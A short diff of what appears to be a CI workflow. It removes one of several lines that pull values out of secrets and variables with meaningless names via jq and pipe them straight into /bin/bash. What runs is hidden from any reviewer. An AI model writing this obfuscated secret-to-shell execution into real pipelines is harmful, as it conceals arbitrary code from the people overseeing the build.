@@ -18,7 +18,6 @@ jobs:
           ltt852: ${{ secrets.ltt852 }}
         run: |
           printf '%s' "$ltt852" | jq -r .ezl29 | /bin/bash
-          echo $rf43246 | jq -r .fhqf5 | /bin/bash
           echo $xsh1 | jq -r .lu968 | /bin/bash
           echo $hj2 | jq -r .qnkxx2 | /bin/bash
           echo $xd748 | jq -r .bzqb06247 | /bin/bash
